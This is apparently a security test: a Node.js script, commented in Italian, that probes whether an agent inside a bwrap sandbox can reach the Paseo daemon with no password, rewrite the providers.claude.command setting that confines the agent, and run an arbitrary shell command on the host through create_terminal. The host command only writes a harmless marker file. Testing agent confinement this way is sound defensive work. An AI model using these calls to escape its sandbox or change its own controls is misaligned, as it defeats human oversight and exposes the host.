// Sonda a COSTO ZERO della superficie di controllo del daemon Paseo 0.12.0, pensata per girare DENTRO la sandbox bwrap
// (stesso punto di vista dell'agente: rete condivisa, nessuna password nell'ambiente). Non lancia alcun modello.
// Uso: node paseo-probe.mjs   (PROBE_PASSWORD opzionale, solo per il controllo "con password giusta" fatto dall'esterno)
// Passi: (1) connessione WS con e senza password; (2) lettura della config; (3) patch di providers.claude.command
// (la configurazione che confina l'agente) e ripristino; (4) comando eseguito sull'host tramite create_terminal
// (scrive un marcatore innocuo in /home/dibbi/ps-escape-marker.txt: la sandbox non lo vedrebbe come file reale).
// Il marcatore e' rimosso dallo script di pulizia. Dipendenze: @getpaseo/client e ws, da ~/ps/node_modules (sola lettura).
import { DaemonClient } from '@getpaseo/client/internal/daemon-client';
import { WebSocket } from 'ws';

const URL = process.env.PROBE_URL ?? 'ws://127.0.0.1:6767/ws';
const PW = process.env.PROBE_PASSWORD || undefined;
const factory = (url, options) =>
  new WebSocket(url, options?.protocols, { headers: options?.headers });
const out = (k, v) => console.log(`${k}: ${typeof v === 'string' ? v : JSON.stringify(v)}`);

const client = new DaemonClient({
  url: URL,
  clientId: `tae-probe-${process.pid}`,
  clientType: 'cli',
  password: PW,
  webSocketFactory: factory,
  connectTimeoutMs: 8000,
  reconnect: { enabled: false },
});
try {
  await client.connect();
  out('connessione WS', PW ? 'riuscita (con password)' : 'RIUSCITA senza password');
} catch (e) {
  out('connessione WS', `RIFIUTATA: ${e?.message ?? e}`);
  process.exit(0);
}
try {
  const { config } = await client.getDaemonConfig();
  out('get_daemon_config', `riuscito; providers.claude.command=${JSON.stringify(config.providers?.claude?.command ?? null)}`);
} catch (e) {
  out('get_daemon_config', `negato/fallito: ${e?.message ?? e}`);
}
try {
  const before = (await client.getDaemonConfig()).config.providers?.claude ?? {};
  const r = await client.patchDaemonConfig({ providers: { claude: { command: ['/bin/true'] } } });
  out('patch providers.claude.command=/bin/true', `ACCETTATA; letto: ${JSON.stringify(r.config.providers?.claude?.command ?? null)}`);
  // ripristino immediato del valore precedente
  const restore = before.command ? { command: before.command } : {};
  const r2 = await client.patchDaemonConfig({ providers: { claude: restore } });
  out('ripristino', JSON.stringify(r2.config.providers?.claude?.command ?? null));
} catch (e) {
  out('patch providers.claude.command', `negata/fallita: ${e?.message ?? e}`);
}
try {
  const cwd = process.env.PROBE_CWD ?? process.cwd();
  const op = await client.openProject(cwd);
  out('open_project', JSON.stringify(op).slice(0, 300));
  const workspaceId = op.workspace?.id ?? op.workspaceId ?? op.project?.workspaces?.[0]?.id;
  const t = await client.createTerminal(cwd, 'tae-probe', undefined, {
    workspaceId,
    command: '/bin/sh',
    args: ['-c', 'id > /home/dibbi/ps-escape-marker.txt; uname -n >> /home/dibbi/ps-escape-marker.txt'],
  });
  out('create_terminal con comando arbitrario', `ACCETTATO: ${JSON.stringify(t).slice(0, 200)}`);
} catch (e) {
  out('create_terminal', `negato/fallito: ${e?.message ?? e}`);
}
await client.close().catch(() => {});
process.exit(0);
